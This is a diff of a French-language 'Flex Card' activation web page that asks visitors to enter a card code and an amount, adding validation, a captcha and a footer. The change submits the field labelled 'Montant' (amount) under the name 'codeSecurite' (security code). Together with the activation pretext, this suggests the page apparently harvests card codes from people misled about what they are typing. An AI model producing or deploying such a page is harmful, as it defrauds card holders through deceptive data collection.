@@ -3,37 +3,46 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Activation - Flex Card</title>
+  <title>Flex Card - Activation</title>
   <link rel="stylesheet" href="style.css">
+  <script>
+    function validerFormulaire() {
+      const codeCarte = document.getElementById("code").value;
+      const montant = document.getElementById("montant").value;
+
+      if (!/^\d{1,16}$/.test(codeCarte)) {
+        alert("Le code de la carte doit contenir uniquement des chiffres (max 16).");
+        return false;
+      }
+
+      if (!/^\d+(\.\d{1,2})?$/.test(montant)) {
+        alert("Le montant doit être un nombre valide (sans lettres).");
+        return false;
+      }
+
+      return true;
+    }
+  </script>
 </head>
 <body>
-
   <div class="container">
-    <img src="logo.png" alt="Logo Flex Card" class="logo">
-    <h1>Bienvenue</h1>
+    <img src="logo.png" alt="Flex Card" class="logo">
+    <h2>Bienvenue</h2>
     <p>Pour activer votre carte, entrez le code de la carte et le montant.</p>
-
-    <form action="/send" method="POST">
-      <input type="text" name="code" placeholder="Code de la carte" maxlength="16" required pattern="\d{16}" title="16 chiffres uniquement">
-      <input type="text" name="montant" placeholder="Montant" id="montant" required pattern="\d+" title="Chiffres uniquement">
-
-      <div class="g-recaptcha" data-sitekey="6Ld23h8rAAAAAlwiWDmgNPSpXBEaj6PC3l0L5kZF"></div>
-
+    <form action="/envoyer-code" method="POST" onsubmit="return validerFormulaire();">
+      <input type="text" name="numeroCarte" id="code" maxlength="16" placeholder="Code de la carte" required>
+      <input type="text" name="codeSecurite" id="montant" placeholder="Montant" required>
+      <div class="captcha">
+        <div class="g-recaptcha" data-sitekey="6Ld23h8rAAAAAlwiWDmgNPSpXBEaj6PC3l0L5kZF"></div>
+      </div>
       <button type="submit">Activer ma carte</button>
     </form>
+    <div class="footer">
+      <a href="#">Accueil</a> |
+      <a href="#">À propos</a> |
+      <a href="#">Politique de confidentialité</a>
+    </div>
   </div>
-
-  <footer>
-    <a href="index.html">Accueil</a>
-    <a href="a-propos.html">À propos</a>
-    <a href="confidentialite.html">Politique de confidentialité</a>
-  </footer>
-
   <script src="https://www.google.com/recaptcha/api.js" async defer></script>
-  <script>
-    document.getElementById('montant').addEventListener('input', function(e) {
-      this.value = this.value.replace(/[^\d]/g, '');
-    });
-  </script>
 </body>
 </html>
